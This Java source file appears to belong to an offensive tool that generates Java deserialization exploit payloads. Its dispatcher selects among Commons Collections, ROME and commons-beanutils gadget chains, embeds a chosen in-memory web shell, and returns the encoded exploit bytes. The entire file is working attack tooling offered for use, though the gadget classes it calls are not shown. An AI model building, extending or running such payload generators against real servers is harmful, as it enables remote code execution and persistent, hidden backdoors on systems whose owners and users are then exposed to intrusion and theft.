package main.exploit;

import main.exploit.payload.*;
import main.utils.EncodeUtils;
import main.utils.ShowUtils;

public class PayloadCreate {
    public static String expCreate(String gadgetName, String encodeType, String memShellType) {
        byte[] expBytes;
        try {
            if (gadgetName.equals("cc4")) {
                CC4Exp cc4_Exp = new CC4Exp(memShellType);
                 expBytes = cc4_Exp.exploit();
                return EncodeUtils.encodeExp(encodeType, expBytes);
            } else if (gadgetName.equals("cc7")){
                CC7Exp cc7Exp = new CC7Exp(memShellType);
                expBytes = cc7Exp.exploit();
                return EncodeUtils.encodeExp(encodeType, expBytes);
            } else if (gadgetName.equals("cc2")){
                CC2Exp cc2Exp = new CC2Exp(memShellType);
                expBytes = cc2Exp.exploit();
                return EncodeUtils.encodeExp(encodeType, expBytes);
            } else if (gadgetName.equals("cc5")){
                CC5Exp cc5Exp = new CC5Exp(memShellType);
                expBytes = cc5Exp.exploit();
                return EncodeUtils.encodeExp(encodeType, expBytes);
            } else if (gadgetName.equals("cc6")){
                CC6Exp cc6Exp = new CC6Exp(memShellType);
                expBytes = cc6Exp.exploit();
                return EncodeUtils.encodeExp(encodeType, expBytes);
            } else if (gadgetName.equals("rome1.0")){
                Rome1Exp rome1Exp = new Rome1Exp(memShellType);
                expBytes = rome1Exp.exploit();
                return EncodeUtils.encodeExp(encodeType, expBytes);
            } else if (gadgetName.equals("rome1.7")){
                Rome1_7Exp rome1_7Exp = new Rome1_7Exp(memShellType);
                expBytes = rome1_7Exp.exploit();
                return EncodeUtils.encodeExp(encodeType, expBytes);
            } else if (gadgetName.equals("commons-beanutils")){
                CommonsBeanutilsExp commonsBeanutilsExp = new CommonsBeanutilsExp(memShellType);
                expBytes = commonsBeanutilsExp.exploit();
                return EncodeUtils.encodeExp(encodeType, expBytes);
            } else {
                System.out.println("gadget not found");
                System.out.println(ShowUtils.showHelp());
            }
        } catch (Exception e){
            e.printStackTrace();
        }
        return "";
    }

}
